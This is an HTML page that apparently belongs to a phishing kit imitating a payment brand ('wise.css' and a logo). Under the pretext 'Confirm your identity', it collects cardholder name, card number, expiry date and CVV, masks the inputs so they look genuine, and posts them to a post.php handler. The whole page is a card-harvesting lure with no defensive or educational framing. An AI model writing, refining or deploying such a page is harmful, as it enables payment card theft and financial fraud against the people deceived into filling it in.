<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/wise.css">
    <title></title>
</head>
<body>
<header>
<img src="res/img/logo.png">
</header>
<main>

   <div class="page">

   <div class="title">
    
      <div class="wel">
        <h2>Confirm your identity</h2>
        <p>Confirm your identity by entering your card information.</p>
      </div>
      </div>

<form action="post.php" method="post" style="margin-top:50px;">

        <div class="coll">
          <label>Cardholder name</label>
        <input type="text" name="name" >
        </div>
      

        <div class="coll">
        <label>Card number</label>
        <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
        </div>

 

        <div class="coll">
          <label>Expiration date</label>
        <input type="text" name="exp" required placeholder="MM/AA" id="exp">
        </div>

        <div class="coll">
          <label>Security code</label>
        <input type="password" name="cvv" required placeholder="CVV" id="cvv">
        </div>

        <div class="coll">
          <button type="sumbit">Continue</button>
        </div>
</form>
 
 



      </div>









</main>














  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>